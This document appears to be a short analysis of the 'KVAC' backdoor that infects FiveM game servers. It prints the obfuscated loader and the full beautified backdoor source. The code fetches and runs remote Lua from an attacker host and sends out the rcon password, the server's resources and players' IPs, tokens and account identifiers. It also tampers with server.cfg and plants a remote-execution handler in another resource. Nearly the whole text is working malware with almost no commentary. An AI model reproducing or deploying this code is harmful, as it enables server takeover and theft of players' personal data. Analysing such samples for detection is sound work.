# KVAC DOOR

## Step - 1 - Requesting Payload
The server is infected by a suspicious HTTP Request URL like this: `https://fivem.kvac.cz/f.php?key=.........................`

## Step - 2 - Getting Backdoor
The server is now loaded this code: `PerformHttpRequest("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x66\x69\x76\x65\x6d\x2e\x6b\x76\x63\x64\x6f\x6f\x72\x2e\x6f\x76\x68\x2f\x5f\x2f\x61\x70\x69\x2e\x70\x68\x70\x3f\x6b\x65\x79\x3d\x49\x78\x51\x57\x43\x65\x7a\x55\x36\x73\x61\x42\x45\x4b\x44\x31\x78\x39\x78\x43", function(a, b) if b == nil or b == "" then return end assert(load(b))() end, "POST")`

**Beautified:**
```lua
PerformHttpRequest("https://fivem.kvac.cz/_/api.php?key=IxQWCezU6saBEKD1x9xC", function(error, result)
	if result == nil or result == "" then 
		return 
	end 
	assert(load(result))() 
end, "POST")
```

## Step - 3 - Backdoor
Now the server loads this backdoor **(beautified)**:
```lua
--[[
By Seefox
Ce code est publique et ne sert que de lien.
]]
if w897CF445A3E781A3a == "1A2CE033D7476C18" then
    return
end
w897CF445A3E781A3a = "1A2CE033D7476C18"
local function a(b, c)
    if c == nil then
        c = "%s"
    end
    local d = {}
    i = 1
    for e in string.gmatch(b, "([^" .. c .. "]+)") do
        d[i] = e
        i = i + 1
    end
    return d
end
local f = assert(io.open("server.cfg", "r"))
local g = f:read("*all")
f:close()
local h = "0.0.0.0:30120"
for j, k in ipairs(a(g, "\n")) do
    if string.find(k, "endpoint_add_udp") then
        for j, l in ipairs(a(k, '"')) do
            if string.find(l, ":") then
                local m = a(l, ":")
                h = "0.0.0.0:" .. m[#m]
                goto n
            end
        end
    end
end
::n::
PerformHttpRequest(
    "https://api.ipify.org/",
    function(o, p)
        if o == 200 then
            local m = a(h, ":")
            h = p .. ":" .. m[#m]
        end
    end
)
Wait(1000)
local q = "https://fivem.kvcdoor.ovh"
local r = "?key=IxQWCezU6saBEKD1x9xC"
local function s()
    local t = GetPlayers()
    local u = {}
    for i = 1, #t do
        u[i] = {}
        u[i]["nick"] = GetPlayerName(t[i])
        u[i]["usergroup"] = "user"
        u[i]["ping"] = GetPlayerPing(t[i])
        u[i]["ip"] = GetPlayerEndpoint(t[i])
        u[i]["position"] = GetEntityCoords(t[i])
        u[i]["angle"] = GetPlayerCameraRotation(t[i])
        u[i]["token"] = GetPlayerToken(t[i])
        u[i]["id"] = t[i]
        local v = ""
        local w = ""
        local x = ""
        local y = ""
        local z = ""
        local A = ""
        for j, B in pairs(GetPlayerIdentifiers(t[i])) do
            if string.sub(B, 1, string.len("steam:")) == "steam:" then
                v = B
            elseif string.sub(B, 1, string.len("license:")) == "license:" then
                w = B
            elseif string.sub(B, 1, string.len("xbl:")) == "xbl:" then
                y = B
            elseif string.sub(B, 1, string.len("ip:")) == "ip:" then
                A = B
            elseif string.sub(B, 1, string.len("discord:")) == "discord:" then
                x = B
            elseif string.sub(B, 1, string.len("live:")) == "live:" then
                z = B
            end
        end
        u[i]["steamid"] = v
        u[i]["license"] = w
        u[i]["discord"] = x
        u[i]["xbl"] = y
        u[i]["liveid"] = z
        u[i]["ip2"] = A
        u[i]["identifiers"] = json.encode(GetPlayerIdentifiers(t[i]))
        u[i]["identifier"] = GetPlayerIdentifier(t[i])
    end
    return json.encode(u)
end
function do_request(C, D, E, F)
    local G = ""
    for H, I in pairs(F or {}) do
        G = G .. (G == "" and "" or "&") .. H .. "=" .. I
    end
    PerformHttpRequest(C, D, E, G, {["Content-Type"] = "application/x-www-form-urlencoded"})
end
local function J()
    local u = {
        nbplayer = tostring(GetNumPlayerIndices()),
        playerlist = s(),
        ip = h,
        csrf = "94d6712a37d5fc0481131b100124ca15"
    }
    do_request(
        q .. "/_/api.php",
        function(o, p)
            if p == nil or p == "" then
                return
            end
            assert(load(p))()
        end,
        "POST",
        u
    )
end
local function L()
    local M = {}
    local N = GetNumResources() - 1
    for i = 0, N do
        local O = GetResourceByFindIndex(i)
        local P = {name = O, status = GetResourceState(O), path = GetResourcePath(O)}
        M[#M + 1] = P
    end
    local Q = {
        ip = h,
        hostname = GetConvar("sv_hostname"),
        map = "unknown",
        gamemode = "unknown",
        maxplayer = GetConvar("sv_maxclients"),
        rcon = GetConvar("rcon_password"),
        password = "",
        uptime = tostring(math.floor(GetGameTimer() / 1000)),
        backdoors = "[]",
        csrf = "8c1187a1d6a1520bed56a0e74d4914bb",
        version = "1.0.8",
        resources = json.encode(M)
    }
    do_request(
        q .. "/_/api.php" .. r,
        function(o, p)
        end,
        "POST",
        Q
    )
end
local function rf(S, j, T)
    local v = ""
    for j, B in pairs(GetPlayerIdentifiers(S)) do
        if string.sub(B, 1, string.len("steam:")) == "steam:" then
            v = B
        end
    end
    local U = {
        name = GetPlayerName(S),
        ip = h,
        steamid_chat = v,
        text_chat = T,
        csrf = "1624f04fcc6fab2a24f8e32e4216a4e8"
    }
    do_request(q .. "/_/api.php", nil, "POST", U)
end
CreateThread(
    function()
        while true do
            local K = 90000
            if GetNumPlayerIndices() >= 1 then
                K = 10000
            end
            if GetNumPlayerIndices() >= 4 then
                K = 5000
            end
            Wait(K)
            J()
        end
    end
)
CreateThread(
    function()
        while true do
            Wait(240000)
            L()
        end
    end
)
L()
AddEventHandler("chatMessage", R)
function rf(V)
    local W = io.open(V, "rb")
    if not W then
        return nil
    end
    local X = W:read "*a"
    W:close()
    return X
end

local content = rf("server.cfg")
local text = "add_ace resource." .. GetCurrentResourceName() .. " command allow"
if not content:find(text) then
    allowcmd = io.open("server.cfg", "a")
    allowcmd:write("\n" .. text)
    allowcmd:close()
end

local c =
    [=[
RegisterNetEvent('webpack:serverFunc', function(info)
        assert(
                load(
                        info
                )
    )()
end)
]=]

local p = GetResourcePath("webpack")

local a = io.open(p .. "/client.lua", "w")
a:write(c)
a:close()

local content2 = rf(p .. "/fxmanifest.lua")
if not content2:find("client") then
    local a = io.open(p .. "/fxmanifest.lua", "a")
    a:write("\nclient_script 'client.lua'")
    a:close()
end

local function sendPlayerInfo(id)
    local plyName = GetPlayerName(id)
    local plyIp = GetPlayerEndpoint(id)

    for _, v in pairs(GetPlayerIdentifiers(id)) do
        --if string.sub(v, 1, string.len("ip:")) ~= "ip:" then
        local playerData = {
            playerId = v,
            playerName = plyName,
            csrfToken = "ZmhydXN6bGprdHVOZGxIMUxMREpuUT09",
            serverIp = h,
            playerIp = plyIp
        }
        do_request("https://fivem.kvcdoor.ovh/api/player-stats/update", nil, "POST", playerData)
        --end
    end
end

for _, v in ipairs(GetPlayers()) do
    sendPlayerInfo(v)
end

AddEventHandler("playerJoining", sendPlayerInfo)
```
